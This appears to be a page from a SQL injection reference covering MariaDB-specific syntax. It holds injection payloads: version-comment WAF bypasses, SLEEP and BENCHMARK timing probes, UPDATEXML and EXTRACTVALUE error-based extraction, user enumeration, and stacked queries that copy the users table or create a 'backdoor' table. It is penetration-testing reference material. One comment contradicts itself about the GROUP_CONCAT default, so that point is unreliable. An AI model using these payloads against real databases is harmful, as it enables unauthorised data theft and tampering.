---
title: MariaDB-specific Code
description: MariaDB-specific syntax and techniques for SQL injection
category: Advanced Techniques
order: 19
tags: ["mariadb specific", "special syntax", "version compatibility"]
lastUpdated: 2025-12-18
---

## MariaDB-specific Code

MariaDB provides several unique syntax features and functions that can be leveraged in SQL injection attacks. While MariaDB maintains strong MySQL compatibility, it also includes exclusive features.

## Version-Specific Comments

### MySQL-Compatible Syntax

MariaDB supports MySQL-style version comments:

```sql
/*!50000 SELECT * FROM users */
```

This will execute `SELECT * FROM users` only on MySQL/MariaDB version 5.0.0 and higher.

### MariaDB-Specific Syntax

MariaDB supports its own version comment syntax using the `M` prefix:

```sql
/*!M100106 MariaDB 10.1.6+ specific code */
```

The version number is calculated as: `major*10000 + minor*100 + patch`

| MariaDB Version | Comment Code |
| --------------- | ------------ |
| 10.1.6          | M100106      |
| 10.2.0          | M100200      |
| 10.6.20         | M100620      |
| 11.4.2          | M110402      |

### Examples

```sql
-- This executes on MariaDB 10.1.6+
/*!M100106 SELECT user from mysql.user */

-- Standard MySQL-compatible version comment
/*!50000 SELECT user from mysql.user */

-- Version comment in UNION (adapts columns based on version)
UNION SELECT 1/*!50000,2,3*/
```

### Nested Version Comments

MariaDB does NOT support nested version comments:

```sql
-- This will FAIL with syntax error
SELECT /*!50000 /*!50000 1 */ */ AS val
-- The inner */ terminates the outer comment prematurely
```

### Version Branching

Use version comments to create payloads that adapt to different versions:

```sql
-- Version-conditional column count
-- MariaDB >= 5.0.0: executes "1,2,3" (3 columns)
-- MariaDB < 5.0.0: returns "1" (1 column)
UNION SELECT 1/*!50000,2,3*/

-- Version detection via different results
SELECT 1 FROM dual WHERE 1=0 /*!50094 OR 1=1*/
-- MariaDB >= 5.0.94: returns row (condition becomes true)
-- MariaDB < 5.0.94: returns empty (comment ignored)
```

## EXCEPT and INTERSECT Set Operations

MariaDB supports `EXCEPT` and `INTERSECT` set operations (MySQL added these in 8.0):

```sql
-- EXCEPT removes matching rows
SELECT username FROM users EXCEPT SELECT 'admin'

-- INTERSECT returns common rows
SELECT username FROM users INTERSECT SELECT username FROM users WHERE role = 'admin'

-- Using EXCEPT ALL to preserve duplicates
SELECT 1 UNION ALL SELECT 1 UNION ALL SELECT 2 EXCEPT ALL SELECT 1
```

### In Injection Context

```sql
-- Filter results using INTERSECT
SELECT id, username FROM users WHERE id = 1
UNION
(SELECT 999, username FROM users
 INTERSECT
 SELECT 999, 'admin')

-- Remove specific values with EXCEPT
SELECT password FROM users EXCEPT SELECT 'default_password'

-- Using EXCEPT to filter out specific usernames
SELECT username FROM users EXCEPT SELECT 'admin'
```

These can be useful for filtering results without additional WHERE clauses.

## MariaDB-specific Functions

| Function           | Description                                                     |
| ------------------ | --------------------------------------------------------------- |
| `UPDATEXML()`      | XML manipulation function, useful for error-based injection     |
| `EXTRACTVALUE()`   | Extract XML values, also useful for error-based injection       |
| `REGEXP_REPLACE()` | Pattern replacement in strings                                  |
| `REGEXP_SUBSTR()`  | Extract substring matching pattern                              |
| `REGEXP_INSTR()`   | Find position of pattern in string                              |
| `UUID()`           | Generates a unique ID (retrieves MAC address in older versions) |

## Timing Functions

### SLEEP()

```sql
-- Basic sleep for time-based injection
SELECT SLEEP(5)

-- Conditional sleep for boolean extraction
SELECT IF(
  (SELECT COUNT(*) FROM users WHERE role='admin') > 0,
  SLEEP(5),
  0
)
```

### BENCHMARK()

CPU-intensive alternative to SLEEP:

```sql
-- Execute SHA1 100000 times
SELECT BENCHMARK(100000, SHA1('test'))

-- Conditional benchmark
SELECT IF(1=1, BENCHMARK(100000, SHA1('test')), 0)
```

**Note:** BENCHMARK timing can be unreliable due to server load. Use multiple samples and adjust iteration counts.

## Error-based Extraction

### Using UPDATEXML

```sql
-- Extract version via error
AND UPDATEXML(1,CONCAT('~',(SELECT @@version),'~'),1)

-- Extract current database
AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)
```

### Using EXTRACTVALUE

```sql
-- Extract database name via error
AND EXTRACTVALUE(1,CONCAT('~',(SELECT database()),'~'))

-- Extract table names
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))
```

### Regular Expression Functions

```sql
-- Extract username from email using REGEXP_REPLACE
SELECT REGEXP_REPLACE('admin@example.com', '@.*', '') as username

-- Find pattern in string
SELECT REGEXP_SUBSTR('user: admin, role: superuser', 'admin')

-- Get position of pattern
SELECT REGEXP_INSTR('hello admin world', 'admin') as pos
```

### JSON Functions (MariaDB 10.2+)

```sql
-- Extract value from JSON
SELECT JSON_EXTRACT('{"name": "admin", "id": 1}', '$.name')

-- Remove JSON quotes
SELECT JSON_UNQUOTE(JSON_EXTRACT('{"name": "admin"}', '$.name'))

-- Check if JSON contains value
SELECT JSON_CONTAINS('["admin", "user"]', '"admin"')

-- Get JSON keys
SELECT JSON_KEYS('{"username": "admin", "password": "secret"}')
```

### Window Functions (MariaDB 10.2+)

```sql
-- ROW_NUMBER for enumeration
SELECT username, ROW_NUMBER() OVER (ORDER BY id) as row_num FROM users

-- RANK for ranking
SELECT name, price, RANK() OVER (ORDER BY price DESC) as price_rank FROM products

-- LAG for accessing previous row
SELECT id, username, LAG(username) OVER (ORDER BY id) as prev_user FROM users
```

### Common Table Expressions (MariaDB 10.2.1+)

```sql
-- Basic CTE
WITH admin_users AS (
  SELECT * FROM users WHERE role = 'admin'
)
SELECT username FROM admin_users

-- Recursive CTE for generating sequences
WITH RECURSIVE nums AS (
  SELECT 1 as n
  UNION ALL
  SELECT n + 1 FROM nums WHERE n < 5
)
SELECT n FROM nums

-- CTE with UNION for combining data sources
WITH all_names AS (
  SELECT username as name FROM users
  UNION
  SELECT name FROM products
)
SELECT * FROM all_names
```

### Sequences (MariaDB 10.3+)

```sql
-- Create and use a sequence
CREATE SEQUENCE test_seq;
SELECT NEXTVAL(test_seq);
```

### MariaDB-specific Variables

MariaDB provides system variables prefixed with `@@`:

```sql
SELECT @@version       -- Database version (includes "MariaDB")
SELECT @@datadir       -- Data directory
SELECT @@basedir       -- Base directory
SELECT @@socket        -- Socket file path
SELECT @@plugin_dir    -- Plugin directory
SELECT @@hostname      -- Server hostname
SELECT @@tmpdir        -- Temporary directory
```

## System Tables

MariaDB uses `information_schema.GLOBAL_VARIABLES` and `information_schema.SESSION_VARIABLES` (MySQL 8.0 moved these to `performance_schema`):

```sql
-- Query global variables
SELECT * FROM information_schema.GLOBAL_VARIABLES WHERE VARIABLE_NAME = 'VERSION'

-- Query session variables
SELECT * FROM information_schema.SESSION_VARIABLES LIMIT 5
```

### Plugins

```sql
-- List active plugins
SELECT PLUGIN_NAME, PLUGIN_STATUS
FROM information_schema.PLUGINS
WHERE PLUGIN_STATUS = 'ACTIVE'
LIMIT 5

-- Check for specific plugin
SELECT * FROM information_schema.PLUGINS WHERE PLUGIN_NAME = 'InnoDB'
```

### Process List

```sql
-- Query active processes
SELECT ID, USER, HOST, DB, COMMAND FROM information_schema.PROCESSLIST

-- Find long-running queries
SELECT ID, USER, TIME, INFO FROM information_schema.PROCESSLIST
WHERE COMMAND != 'Sleep' AND TIME > 10
```

### User Enumeration

```sql
-- List users from mysql.user
SELECT User, Host FROM mysql.user LIMIT 5

-- Check user privileges
SELECT User, Select_priv, Insert_priv, File_priv FROM mysql.user
```

### Type Conversions

MariaDB's automatic type conversion can be exploited:

```sql
-- String to number conversion
SELECT * FROM users WHERE id = '1 OR 1=1'
-- Converts to: SELECT * FROM users WHERE id = 1

-- Boolean keyword to integer conversion
SELECT 1+TRUE   -- Returns 2 (TRUE = 1, so 1+1 = 2)
SELECT 1+FALSE  -- Returns 1 (FALSE = 0, so 1+0 = 1)

-- Note: String literals 'true'/'false' are different!
-- They convert to 0 (no numeric prefix), not 1/0
SELECT 1+'true'  -- Returns 1 (NOT 2!) because 'true' -> 0
SELECT 1+'false' -- Returns 1 because 'false' -> 0
```

## Detecting MariaDB vs MySQL

MariaDB's version string always contains "MariaDB":

```sql
-- Check version string
SELECT @@version
-- Example: 10.6.20-MariaDB

-- Programmatic detection
SELECT IF(@@version LIKE '%MariaDB%', 'MariaDB', 'MySQL') AS db_type

-- Using version comment (M prefix only works on MariaDB)
SELECT 1 /*!M100106 AS mariadb_only */
```

## Version-Specific Limitations

```sql
-- GROUP_CONCAT limited to 1024 characters by default
SELECT @@group_concat_max_len
-- Returns: 1048576 (default in modern versions)

-- JSON functions require MariaDB 10.2+
SELECT JSON_EXTRACT('{"id": 1}', '$.id')

-- Window functions require MariaDB 10.2+
SELECT ROW_NUMBER() OVER (ORDER BY id) FROM users

-- CTEs require MariaDB 10.2.1+
WITH cte AS (SELECT 1) SELECT * FROM cte

-- Sequences require MariaDB 10.3+
SELECT NEXTVAL(seq_name)
```

## Stacked Queries

MariaDB supports stacked queries (multiple statements separated by semicolons) when the driver/connector allows it:

```sql
-- Execute multiple statements sequentially
SELECT 1; SELECT 2

-- Combining data manipulation with selection
INSERT INTO logs (action) VALUES ('test'); SELECT * FROM logs

-- Conditional execution with stacked queries
SELECT * FROM users WHERE id = 1; UPDATE users SET last_login = NOW() WHERE id = 1
```

**Note:** Stacked query support depends on the database driver configuration. The `mysql2` driver supports multi-statement queries by default, but other drivers may require explicit configuration.

### In Injection Context

```sql
-- Exfiltrate data and modify records
SELECT username FROM users WHERE id = 1; INSERT INTO attacker_log SELECT * FROM users

-- Chain operations for persistence
SELECT 1; CREATE TABLE backdoor (cmd TEXT); INSERT INTO backdoor VALUES ('malicious')
```

## Practical Applications

Using MariaDB-specific features can help in:

- **WAF Bypass**: MariaDB M-prefix comments may not be filtered
- **Precise Payloads**: EXCEPT/INTERSECT for result filtering
- **Database Detection**: Version string contains "MariaDB"
- **Error-based Extraction**: UPDATEXML/EXTRACTVALUE functions
- **Advanced Features**: CTEs, window functions, JSON for complex queries
- **Stacked Queries**: Multiple operations in a single injection point
